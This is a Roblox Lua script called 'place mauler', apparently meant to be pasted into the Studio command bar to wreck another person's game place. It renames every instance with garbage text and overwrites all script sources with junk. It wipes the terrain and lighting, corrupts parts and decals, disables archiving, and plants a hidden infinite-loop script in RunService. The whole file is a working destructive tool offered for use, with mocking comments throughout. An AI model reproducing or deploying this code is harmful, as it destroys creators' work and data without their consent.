local reflectionsrv = game:GetService("ReflectionService")
local terrain = workspace.Terrain
local lighting = game.Lighting
local allmaterials = Enum.Material:GetEnumItems()	
--[[
place mauler v1
run this in the command bar to nuke someones game
config below idk


]]

local config = {
	["GarbageName"] = true, -- scrambles names n stuff
	["InstanceClobServices"] = true, -- adds standalonepluginscripts n stuff to affected instances
	["CorruptParts"] = true, -- obviously it corrupts the parts u genius
	["SourceMAULER"] = true, -- horridly MAULS YOUR SCRIPTS
	["ScriptNukeThang"] = true, -- puts a script in a service, when you run the game it just nukes the gamee. LEL.
	["HintClob"] = true, -- spews hints into a few services and stuff
	["DecalKill"] = true, -- just overrides decal textures i guess


	["murderscripteditor"] = false -- this just floods script editor with very high numbers bro
}

local function wicked(amount)
	local pls = {}
	for i = 1,amount do
		table.insert(pls,utf8.char(0x1000 + math.random(0,0x300)))
	end
	return table.concat(pls)
end
local function stupidasfambience()
	local output = Instance.new("AudioDeviceOutput")
	local snd = Instance.new("AudioPlayer")
	local wire = Instance.new("Wire")
	output.Parent = game:GetService("NotificationService")
	snd.Parent = output
	wire.Parent = output
	wire.SourceInstance = snd
	wire.TargetInstance = output
	snd.Asset = "rbxassetid://4067643809"
	snd.Looping = true
	snd.PlaybackSpeed = 0.08
	snd:Play()
	wire,snd,output.Name = wicked(400), wicked(400), wicked(400)
end
local function randclr()
	return Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
end
local function corruptedparts(amount)
	for i = 1,amount do
		local part = Instance.new("Part")
		part.Parent = workspace
		part.Name = wicked(30)
		part.Size = Vector3.new(math.random(1,100),math.random(1,100),math.random(1,100))
		part.Position = Vector3.new(math.random(-10000,10000),math.random(-10000,10000),math.random(-10000,10000))
		part.Material = allmaterials[math.random(1,#allmaterials)]
		part.Transparency = math.random(0,100)/100
		part.Reflectance = math.random(0,100)/100
	end
end
stupidasfambience()
terrain:Clear()
local ihateyousotakethis = function()
	local sc = Instance.new("Script")
	sc.Parent = game.RunService
	sc.Name = wicked(100)
	sc.Source = `while true do print("Attempt Nil Nil Attempted To Index ? Nil")end`
end
local function hintslop(amount,parent)
	for i = 1,amount do
		local hint = Instance.new("Hint")
		hint.Parent = parent
		hint.Text = wicked(math.random(1000,20000))
		hint.Name = wicked(math.random(1000,20000))
	end
end
lighting:ClearAllChildren()
for _, ok in game:GetDescendants() do
	pcall(function()
		if config.GarbageName == true then
			ok.Name = wicked(math.random(1,10))
		end
		pcall(function()
			ok.Color = randclr() -- this is stupid asf but sometimes itll work. Maybee. Sometimes.
			ok.Color3 = randclr() -- this is stupid asf but sometimes itll work. Maybee. Sometimes.
		end)
		pcall(function()
		    ok.Text = wicked(300) -- more stupid asf stuff
		end)
		if config.DecalKill == true then
			if ok:IsA("Decal") or ok:IsA("Texture") then
				ok.ColorMapContent = "rbxassetid://124486361573111"
			end
		end
		if config.CorruptParts == true then
			if ok:IsA("Part") or ok:IsA("MeshPart") or ok:IsA("UnionOperation") then
				ok.Color = Color3.fromRGB(math.random(0,255),math.random(0,255),math.random(0,255))
				ok.Size += Vector3.new(math.random(3,20),math.random(3,20),math.random(3,20))
				ok.Position += Vector3.new(math.random(-300,300),math.random(-300,300),math.random(-300,300))
				ok.Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
			end
		end
		if config.InstanceClobServices == true then
			for i = 1,math.random(1,3) do
				local evil = Instance.new("StandalonePluginScripts")
				evil.Parent = ok
				evil.Name = wicked(3)
			end
		end
	end)
	if config.SourceMAULER == true then
		if ok:IsA("Script") or ok:IsA("LocalScript") or ok:IsA("AuroraScript") or ok:IsA("ModuleScript") then
			if config.murderscripteditor == false then
				ok.Source = "-- Nuked by place annihilator V1. "..wicked(1000)..""
			else
				ok.Source = "-- Nuked by place annihilator V1. "..wicked(700000)..""
			end
		end
	end
	ok.Archivable = false
end
if config.ScriptNukeThang == true then
	ihateyousotakethis()
end
if config.HintClob == true then
	hintslop(10,workspace)
end
-- rest of shit that i can do cus i can do it. yep.
local sky = Instance.new("Sky")
sky.Parent = lighting
sky.Name = wicked(1000)
sky.SkyboxBk = "rbxassetid://81394679885657"
sky.SkyboxDn = "rbxassetid://86006896447963"
sky.SkyboxFt = "rbxassetid://110874354594380"
sky.SkyboxLf = "rbxassetid://94655344055360"
sky.SkyboxRt = "rbxassetid://120980285219543"
sky.SkyboxUp = "rbxassetid://135238800252320"
sky.CelestialBodiesShown = false
lighting.Ambient = randclr()
lighting.OutdoorAmbient = randclr()
lighting.ColorShift_Top = randclr()
lighting.ColorShift_Bottom = randclr()
lighting.FogColor = randclr()
corruptedparts(math.random(10,40))
print("successfully smited game lmao")
